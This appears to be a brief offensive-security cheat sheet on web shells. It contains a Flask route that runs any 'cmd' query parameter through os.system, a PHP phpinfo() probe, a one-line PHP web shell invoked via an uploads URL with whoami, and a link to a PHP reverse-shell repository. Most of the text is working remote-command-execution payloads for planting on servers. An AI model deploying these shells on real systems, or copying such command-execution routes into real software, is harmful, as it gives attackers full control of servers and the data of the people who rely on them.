# Routes

`/usr/share/webshells`

### Languages

### Python

```python
@app.route('/rs')
def rce():
    return os.system(request.args.get('cmd'))
```

### PHP

Test if data can render:

```php
# Initial test, gather info
<?php phpinfo(); ?>

# RCE (exmaple execution: example.com/uploads/shell.php?cmd=whoami)
<?php system($_GET['cmd']); ?>
```

### Shells

XAMPP Shells: https://github.com/ivan-sincek/php-reverse-shell/tree/master

